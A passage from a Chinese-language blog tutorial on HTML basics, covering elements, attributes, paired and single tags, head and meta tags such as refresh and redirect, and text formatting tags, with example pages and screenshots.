= “值2”&gt;</code></strong></li></ol></li></ol></blockquote><br><blockquote><p><font color="#FF7F00"><strong>HTML 元素</strong></font></p><ol><li>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</li><li>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</li><li>HTML 元素:<code>&lt;p&gt;这是一个段落。&lt;/p&gt;</code></li></ol></blockquote><hr size="2" color="#00B2EE" width="100%" noshade><ul><li><p>HTML元素是组成HTML文档最基本的部件，它是用标签来表现的，一般来说，“起始标签”表示元素的开始，“结束标签”表示元素的结束。</p></li><li><p>HTML元素分为“有内容的元素”和“空元素”两种。</p></li><li><p>“有内容的元素”是由起始标签、结束标签以及两者之间的元素内容组成的，其中元素内容既可以是需要显示在网页中的文字内容，也可以是其它元素。</p></li></ul><hr size="2" color="#00B2EE" width="100%" noshade><br><blockquote><p><font color="#FF7F00"><strong>HTML 元素属性</strong></font></p><ol><li>HTML 标签可以拥有属性。属性提供了有关 HTML 元素的更多的信息。</li><li>属性总是以名称/值对的形式出现，比如：<code>name=&quot;value&quot;</code>。</li><li>属性值应该始终被包括在<strong>引号内</strong>。双引号是最常用的，不过使用单引号也没有问题。</li></ol></blockquote><hr size="2" color="#00B2EE" width="100%" noshade><ul><li>HTML的元素属性提供了对HTML元素的描述和控制信息，借助于元素属性，HTML网页才会展现丰富多彩且格式美观的内容。</li><li>例如要设置<code>&lt;p&gt;</code>元素中文字内容的颜色为红色，字号为30像素，这时就需要用到HTML元素属性了。如在<code>&lt;p&gt;</code>元素名称的尖括号内添加了<code>style=&quot;color:#ff0000;font-size:30px&quot;</code>内容，浏览器就会按照设定的效果来显示内容。</li></ul><hr size="2" color="#00B2EE" width="100%" noshade><br><br><h3 id="二-HTML-标签"><font color="#FF6347" face="Comic sans MS">二. HTML 标签</font><a href="post/HTML-basics#二-HTML-标签"></a></h3><br><h4 id="2-1-标签介绍"><font color="#3CB371" face="Comic sans MS">2.1 标签介绍</font><a href="post/HTML-basics#2-1-标签介绍"></a></h4><p>按功能排序HTML的标签请参考：<font color="#00B2EE">《<a href="http://www.runoob.com/tags/ref-byfunc.html" target="_blank" rel="noopener">HTML 标签参考手册- (HTML5 标准)</a>》</font> </p><p><strong>HTML标签分两类：</strong>双边标签和单边标签。</p><br><p><strong>1. 双边标签</strong></p><ul><li>双边标签，是指有开始和结束标签，内容放在开始和结束标签之间。如：<code>&lt;b&gt;内容&lt;/b&gt;</code></li></ul><ul><li><p>“属性”的通俗理解：一个东西总是有一些特征，重量，体积等，这就是一个东西的“属性”</p></li><li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></p></li></ul><br><p><strong>2. 单边标签</strong></p><ul><li><p>单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></p></li><li><p>单边标签一般起一个特殊的功能。</p></li><li><p>单边标签常用的有10多个标记。</p></li><li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;</code></strong></p></li></ul><br><p>先来看一下双边标签例子，观察<code>&lt;font&gt;&lt;/font&gt;</code>标签</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>directoree<span class="token punctuation">.</span>top<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">&lt;body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2019/03/08/5c82461ac1553.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>第一个，哈哈哈哈<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>red<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>看看我有什么特别的<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行如下图：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/08/5c828faaaf57d.jpg" alt="3.png" data-zoomable></p></div><br><p>再来看一下单边标签例子，观察<code>&lt;br&gt;</code>标签</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>treecatee<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">&lt;body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2019/03/08/5c82461ac1553.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>第二个，哈哈哈哈<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>red<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>再看看我有什么特别的<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>red<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>再看看我有什么特别的<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行如下图：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/08/5c828fa9efed8.jpg" alt="4.png" data-zoomable></p></div><br><p><strong>HTML标签编写规范</strong></p><p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p><p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p><p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p><p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层，不能交叉嵌套。</p><br><hr size="2" color="#00B2EE" width="100%" noshade><hr size="2" color="#00B2EE" width="100%" noshade><br><h4 id="2-2-常用标签-文本"><font color="#3CB371" face="Comic sans MS">2.2 常用标签-文本</font><a href="post/HTML-basics#2-2-常用标签-文本"></a></h4><ul><li><input checked disabled type="checkbox"> <strong><code>&lt;!DOCTYPE HTML&gt;</code></strong> html5标准网页声明（必须有）</li><li><input checked disabled type="checkbox"> <strong><code>&lt;html&gt;&lt;/html&gt;</code></strong> 声明代码格式（必须有）</li><li><input checked disabled type="checkbox"> <strong><code>&lt;head&gt;&lt;/head&gt;</code></strong> 文件头（必须有）<ul><li><input checked disabled type="checkbox"> <strong><code>&lt;title&gt;&lt;/title&gt;</code></strong> 标题（必须有）</li><li><input disabled type="checkbox"> <strong><code>&lt;meta&gt;</code></strong> 元数据  …..</li></ul></li><li><input checked disabled type="checkbox"> <strong><code>&lt;body&gt;&lt;/body&gt;</code></strong>&emsp;<strong><code>&lt;h1&gt; - &lt;h6&gt;</code></strong>（必须有）</li><li><input disabled type="checkbox"> 文本标签<ul><li><input disabled type="checkbox"> <strong><code>&lt;b&gt;&lt;/b&gt;</code></strong> 加粗</li><li><input disabled type="checkbox"> <strong><code>&lt;i&gt;&lt;/i&gt;</code></strong> 斜体</li><li><input disabled type="checkbox"> <strong><code>&lt;u&gt;&lt;/u&gt;</code></strong> 下划线</li><li><input disabled type="checkbox"> <strong><code>&lt;s&gt;&lt;/s&gt;</code></strong> 删除线</li><li><input disabled type="checkbox"> <strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong> 上标</li><li><input disabled type="checkbox"> <strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong> 下标</li><li><input disabled type="checkbox"> <strong><code>&lt;font&gt;&lt;/font&gt;</code></strong> 字体标记<ul><li><input disabled type="checkbox"> <strong><code>size</code></strong> 大小(1 -&gt; 7)</li><li><input disabled type="checkbox"> <strong><code>color</code></strong> 颜色</li><li><input disabled type="checkbox"> <strong><code>face</code></strong> 字体</li></ul></li></ul></li><li><input disabled type="checkbox"> <strong><code>&lt;p&gt;&lt;/p&gt;</code></strong> 表示一个段落</li><li><input disabled type="checkbox"> <strong><code>&lt;br&gt;</code></strong> 换行 </li><li><input disabled type="checkbox"> <strong><code>&lt;hr&gt;</code></strong> 段落分割线 </li><li><input disabled type="checkbox"> <strong><code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong> 定义预格式化的文本和格式代码块</li><li><input disabled type="checkbox"> <strong><code>&lt;strong&gt;</code>和<code>&lt;em&gt;</code></strong> 加粗和斜体（强调）</li><li><input disabled type="checkbox"> <strong><code>&lt;span&gt;&lt;/span&gt;</code></strong> 对文档中的行内元素进行组合</li></ul><br><p><font size="4" face="Microsoft YaHei"><strong>1. <code>&lt;head&gt;&lt;/head&gt;</code>头标签</strong></font></p><blockquote><p><strong><code>&lt;head&gt;</code></strong>内的元素可包含脚本，指示浏览器在何处可以找到样式表，提供元信息等。<br>可添加到head部分的标签：<code>&lt;title&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;style&gt;</code>:</p><ul><li><strong><code>&lt;title&gt;</code>：</strong>指定整个网页的标题，在浏览器最上方显示。</li><li><strong><code>&lt;base&gt;</code>：</strong>为页面上的所有链接规定默认地址或默认目标(target)。</li><li><strong><code>&lt;meta&gt;</code>：</strong>提供有关页面的基本信息。</li><li><strong><code>&lt;script&gt;</code>：</strong>定义客户端脚本，如JavaScript。</li><li><strong><code>&lt;style&gt;</code>：</strong>定义内部样式表与网页的关系。</li></ul></blockquote><br><ol><li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;title&gt;&lt;/title&gt;</code>：标签定义文档的标题。</strong></font> <br></p><ol><li>title 元素在所有 HTML/XHTML 文档中都是必需的，无属性；</li><li><code>&lt;title&gt;纯文本&lt;/title&gt;</code>中间只能是纯文本；</li><li>title 元素能够：<ol><li>定义浏览器工具栏中的标题</li><li>提供页面被添加到收藏夹时显示的标题</li><li>显示在搜索引擎结果中的页面标题</li><li>告诉用户和搜索引擎这个网页的主要内容是什么，</li><li>搜索引擎可以通过网页标题，迅速的判断出当前网页的主题。</li></ol></li></ol></li></ol><br><hr size="2" color="#00B2EE" width="100%" noshade><ol start="2"><li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;meta&gt;</code>：标签</strong></font> <br><ol><li><code>&lt;meta&gt;</code> 标签提供关于 HTML 文档的元数据。</li><li>元数据不会显示在页面上，但是对于机器是可读的。</li><li>典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。</li><li><code>&lt;meta&gt;</code> 标签始终只能位于 head 元素中。但是头部可以有多个<code>&lt;meta&gt;</code> 标签。</li><li>元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。</li><li><strong>包含属性：（有属性就必须有对应的值(content)）</strong><ol><li><font color="#FF7F00"><strong>content：</strong></font>必须属性。<ol><li>定义与 http-equiv 或 name 属性相关的元信息，content中的内容其实就是各个参数的变量值。</li><li>变量值可以有多个，用半角逗号<code>,</code>隔开。</li></ol></li><li><font color="#FF7F00"><strong>http-equiv：</strong></font>可选属性。可选值：<ol><li><strong><code>content-type</code>，内容类别</strong>，用于设置页面的类别和语言字符集。编写格式<code>&lt;meta http-equiv=“content-type” context=“text/html”；charset=“gb2312”/&gt;</code>，content属性的值代表页面采用HTML代码输出，字符集为gb2312（简体中文），国际化网站开发的话，为了字符统一，建议charset采用utf-8.</li><li><strong><code>refresh</code>。刷新</strong>，用于设置多长时间内网页自己刷新一次，或者用一段时间自动跳转到其他页面，第一种编写格式<code>&lt;meta http-equiv=“refresh” context=“30”/&gt;</code>表示隔30秒刷新一次，第二种编写格式<code>&lt;meta http-equiv=“refresh” context=“30；url=www.google.com”/&gt;</code>，表示30秒后页面自动跳转到<a href="http://www.google.com网站" target="_blank" rel="noopener">www.google.com网站</a></li></ol></li><li><font color="#FF7F00"><strong>name：</strong></font>可选属性。<ol><li>用于页面的关键字和描述，是写给搜索引擎看的；</li><li>与之对应的属性值为content，content中的内容主要是便于搜索引擎机器人查找信息和分类信息用的。</li><li>主要用于描述网页的内容，用于对搜索引擎的优化，必须重点掌握。正确地设置name属性，以便搜索引擎（比如google，baidu）的搜索机器人查找，分类，搜索引擎一般都会自动查找meta值来给网页分类。name的取值(content)如下：<ol><li><strong><code>keywords</code></strong>。即关键字，用于说明网页所包含的关键字等信息，从而提高被搜索引擎搜索到的概率。编写格式为<code>&lt;meta name=&quot;keywords&quot; content =“关键字”/&gt;</code>，content属性的值为用户所设置的具体关键字。（一般可设置多个关键字，他们之间用英文半角的逗号分开，搜索引擎都限制关键字的数量，所以关键字内容要简洁精练）</li><li><strong><code>description</code></strong>。中文意思为”描述”，用于描述网页的主要内容、主题等，合理设置也可以提高被搜索引擎搜索到的概率。格式为<code>&lt;meta name=&quot;description&quot; content =“对页面的描述”/&gt;</code>，content属性值为用户所设置的页面具体描述的内容，最多容纳1024个字符，但搜索引擎一边只显示约前175个字符。</li><li><strong><code>author</code></strong>。作者，用于设置网站作者的名称，比较专业的网站经常用到。格式为<code>&lt;meta name=&quot;author&quot; content =“作者名称”/&gt;</code></li></ol></li></ol></li></ol></li></ol></li></ol><p>可参读：<font color="#00B2EE">《<a href="http://www.php.cn/code/443.html" target="_blank" rel="noopener">HTML &lt;head&gt; 元素</a>》</font> 、<font color="#00B2EE">《<a href="https://www.cnblogs.com/tielemao/archive/2018/05/25/9086693.html" target="_blank" rel="noopener">HTML-head头部浅析</a>》</font> </p><br><p>例1：打开该网页后每隔20秒刷新一次</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>这是个展示网页hhh<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>希望你能够在这里学的开心<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>例2：打开该网页20秒后跳转到百度首页</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2;url<span class="token punctuation">=</span>http://www.baidu.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>                  <span class="token string">'注意这里的2后是分号“;” '</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>跳转网页hhh<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>希望你能够在这里学的开心<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><hr size="2" color="#00B2EE" width="100%" noshade><ol start="3"><li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;base&gt;</code>：标签</strong></font> <br> </p><p><code>&lt;base&gt;</code> 标签为页面上的所有链接设置默认的地址或默认的目标（target）</p></li></ol><br><ol start="4"><li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;link&gt;</code>：标签</strong></font> <br> </p><p><code>&lt;link&gt;</code> 标签定义文档与外部资源之间的关系。</p></li></ol><br><ol start="5"><li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;style&gt;</code>：标签</strong></font> <br> </p><p><code>&lt;style&gt;</code> 标签用于为 HTML 文档定义样式信息。</p></li></ol><br><ol start="6"><li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;script&gt;&lt;/script&gt;</code>：标签</strong></font> <br></p><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如JavaScript。</p></li></ol><br><p><font size="4" face="Microsoft YaHei"><strong>2. <code>&lt;body&gt;</code>标签和标题</strong></font></p><p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code>标签来定义的。</p><p><code>body</code>用法如下：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">用法</th><th align="left">作用</th><th align="left">可选属性/是否赞成使用该属性</th></tr></thead><tbody><tr><td align="left"><code>&lt;body&gt;内容&lt;/body&gt;</code></td><td align="left">定义文档的主体</td><td align="left">alink：规定文档中活动链接（active link）的的颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>background URL：规定文档的背景图。<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>bgcolor：规定文档的背景颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>link：规定文档中未访问链接的默认颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>text：规定文档中所有文本的颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>vlink：规定文档中已被访问链接的颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。</td></tr></tbody></table></div></div><p><strong><code>&lt;body&gt;</code>的常用属性</strong></p><p>bgColor：网页背景色。如：<code>&lt;body  bgColor = “red”&gt;</code></p><p>background：网页背景图片地址。如：<code>&lt;body  background = “images/01.jpg”&gt;</code></p><br><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>demook<span class="token punctuation">.</span>hhh<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2019/03/08/5c82461ac1593.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Nice优秀啊<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>是的呢 ヾ<span class="token punctuation">(</span>๑╹◡╹<span class="token punctuation">)</span>ﾉ" <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/08/5c8246bcd4f93.png" alt="5.png" data-zoomable></p></div><br><br><p><font size="4" face="Microsoft YaHei"><strong>3. 文本修饰标签</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">用法</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><strong><code>&lt;b&gt;&lt;/b&gt;</code></strong></td><td align="left">加粗字体。如：<code>&lt;b&gt;HTML文件&lt;/b&gt;</code> ----&gt; <b>HTML文件</b></td></tr><tr><td align="left"><strong><code>&lt;i&gt;&lt;/i&gt;</code></strong></td><td align="left">斜体italic。如：<code>&lt;i&gt;HTML文本&lt;/i&gt;</code>----&gt; <i>HTML文本</i></td></tr><tr><td align="left"><strong><code>&lt;u&gt;&lt;/u&gt;</code></strong></td><td 